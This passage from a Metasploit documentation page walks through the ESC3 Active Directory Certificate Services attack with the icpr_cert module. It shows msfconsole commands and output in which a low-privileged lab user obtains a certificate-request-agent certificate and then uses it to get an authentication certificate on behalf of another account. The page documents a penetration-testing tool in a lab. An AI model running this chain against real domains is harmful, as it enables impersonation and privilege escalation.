<span class="zs">[*]</span> 192.168.159.10:445 - Connecting to ICertPassage (ICPR) Remote Protocol
<span class="zs">[*]</span> 192.168.159.10:445 - Binding to \cert...
<span class="zg">[+]</span> 192.168.159.10:445 - Bound to \cert
<span class="zs">[*]</span> 192.168.159.10:445 - Building certificate request on behalf of MSFLAB\smcintyre
<span class="zs">[*]</span> 192.168.159.10:445 - Requesting a certificate...
<span class="zg">[+]</span> 192.168.159.10:445 - The requested certificate was issued.
<span class="zs">[*]</span> 192.168.159.10:445 - Certificate UPN: smcintyre@msflab.local
<span class="zs">[*]</span> 192.168.159.10:445 - Certificate SID: S-1-5-21-3402587289-1488798532-3618296993-1000
<span class="zs">[*]</span> 192.168.159.10:445 - Certificate stored at: /home/smcintyre/.msf4/loot/20221107153713_default_unknown_windows.ad.cs_275853.pfx
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span>
</code></pre></div></div><h3 id="issue-a-certificate-with-the-certificate-request-agent-eku-aka-esc3"> <a href="#issue-a-certificate-with-the-certificate-request-agent-eku-aka-esc3" class="anchor-heading" aria-labelledby="issue-a-certificate-with-the-certificate-request-agent-eku-aka-esc3"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Issue A Certificate With The <em>Certificate Request Agent</em> EKU (AKA ESC3)</h3><p>In this scenario, an authenticated user exploits a misconfiguration allowing them to issue a certificate from a template that either contains the <strong>Certificate Request Agent</strong> EKU.</p><p>The user must know:</p><ul><li>A vulnerable certificate template, in this case <code class="language-plaintext highlighter-rouge">ESC3-Test</code>.<li>A target account, in this case <code class="language-plaintext highlighter-rouge">MSFLAB\smcintyre</code>.</ul><p>The steps are identical to ESC2. First a certificate is requested using the vulnerable template. Then it is used to request another certificate on behalf of the target account.</p><h4 id="step-1-1"> <a href="#step-1-1" class="anchor-heading" aria-labelledby="step-1-1"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Step 1</h4><p>The first step is to issue a certificate using the vulnerable certificate template.</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf</span> <span class="p">&gt;</span> use auxiliary/admin/dcerpc/icpr_cert
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set RHOSTS 192.168.159.10
RHOSTS =&gt; 192.168.159.10
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBUser aliddle
SMBUser =&gt; aliddle
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set SMBPass Password1!
SMBPass =&gt; Password1!
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CA msflab-DC-CA
CA =&gt; msflab-DC-CA
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CERT_TEMPLATE ESC3-Test
CERT_TEMPLATE =&gt; ESC3-Test
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> run
<span class="zs">[*]</span> Running module against 192.168.159.10

<span class="zs">[*]</span> 192.168.159.10:445 - Connecting to ICertPassage (ICPR) Remote Protocol
<span class="zs">[*]</span> 192.168.159.10:445 - Binding to \cert...
<span class="zg">[+]</span> 192.168.159.10:445 - Bound to \cert
<span class="zs">[*]</span> 192.168.159.10:445 - Requesting a certificate...
<span class="zg">[+]</span> 192.168.159.10:445 - The requested certificate was issued.
<span class="zs">[*]</span> 192.168.159.10:445 - Certificate UPN: aliddle@msflab.local
<span class="zs">[*]</span> 192.168.159.10:445 - Certificate SID: S-1-5-21-3402587289-1488798532-3618296993-1106
<span class="zs">[*]</span> 192.168.159.10:445 - Certificate stored at: /home/smcintyre/.msf4/loot/20221107154656_default_unknown_windows.ad.cs_831021.pfx
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span>
</code></pre></div></div><h4 id="step-2-1"> <a href="#step-2-1" class="anchor-heading" aria-labelledby="step-2-1"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Step 2</h4><p>The second step is to run the module a second time, using the certificate template to request a certificate on behalf of the target user. The <code class="language-plaintext highlighter-rouge">CERT_TEMPLATE</code> option is updated to one allowing authentication such as the default <code class="language-plaintext highlighter-rouge">User</code> template.</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set PFX /home/smcintyre/.msf4/loot/20221107154656_default_unknown_windows.ad.cs_831021.pfx
PFX =&gt; /home/smcintyre/.msf4/loot/20221107154656_default_unknown_windows.ad.cs_831021.pfx
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set ON_BEHALF_OF MSFLAB\\smcintyre
ON_BEHALF_OF =&gt; MSFLAB\smcintyre
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> set CERT_TEMPLATE User
CERT_TEMPLATE =&gt; User
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span> run
<span class="zs">[*]</span> Running module against 192.168.159.10

<span class="zs">[*]</span> 192.168.159.10:445 - Connecting to ICertPassage (ICPR) Remote Protocol
<span class="zs">[*]</span> 192.168.159.10:445 - Binding to \cert...
<span class="zg">[+]</span> 192.168.159.10:445 - Bound to \cert
<span class="zs">[*]</span> 192.168.159.10:445 - Building certificate request on behalf of MSFLAB\smcintyre
<span class="zs">[*]</span> 192.168.159.10:445 - Requesting a certificate...
<span class="zg">[+]</span> 192.168.159.10:445 - The requested certificate was issued.
<span class="zs">[*]</span> 192.168.159.10:445 - Certificate UPN: smcintyre@msflab.local
<span class="zs">[*]</span> 192.168.159.10:445 - Certificate SID: S-1-5-21-3402587289-1488798532-3618296993-1000
<span class="zs">[*]</span> 192.168.159.10:445 - Certificate stored at: /home/smcintyre/.msf4/loot/20221107154740_default_unknown_windows.ad.cs_567059.pfx
<span class="zs">[*]</span> Auxiliary module execution completed
<span class="zp">msf</span> auxiliary<span class="p">(</span><span class="kc">admin/dcerpc/icpr_cert</span><span class="p">)</span> <span class="p">&gt;</span>
</code></pre></div></div><hr><footer><p><a href="#top" id="back-to-top">Back to top</a></p><p class="text-small text-grey-dk-000 mb-0"> <a href="https://github.com/rapid7/metasploit-framework/tree/master/docs/metasploit-framework.wiki/../../documentation/modules/auxiliary/admin/dcerpc/icpr_cert.md" id="edit-this-page">Edit this page on GitHub</a></p></footer></div></div><div class="search-overlay"></div></div><script type="text/javascript" src="/assets/js/toggle_mode.js"></script> <script> var config = { theme: 'default', logLevel: 'fatal', securityLevel: 'strict', startOnLoad: true, arrowMarkerAbsolute: false, er: { diagramPadding: 20, layoutDirection: 'TB', minEntityWidth: 100, minEntityHeight: 75, entityPadding: 15, stroke: 'gray', fill: 'honeydew', fontSize: 12, useMaxWidth: true, }, flowchart:{ diagramPadding: 8, htmlLabels: true, curve: 'basis', }, sequence: { diagramMarginX: 50, diagramMarginY: 10, actorMargin: 50, width: 150, height: 65, boxMargin: 10, boxTextMargin: 5, noteMargin: 10, messageMargin: 35, messageAlign: 'center', mirrorActors: true, bottomMarginAdj: 1, useMaxWidth: true, rightAngles: false, showSequenceNumbers: false, }, gantt: { titleTopMargin: 25, barHeight: 20, barGap: 4, topPadding: 50, leftPadding: 75, fontSize: 11, gridLineStartPadding: 35, fontFamily: '\'Open Sans\', sans-serif', numberSectionStyles: 4, axisFormat: '%Y-%m-%d', topAxis: false, }, }; mermaid.initialize(config); window.mermaid.init(undefined, document.querySelectorAll('.language-mermaid')); </script>
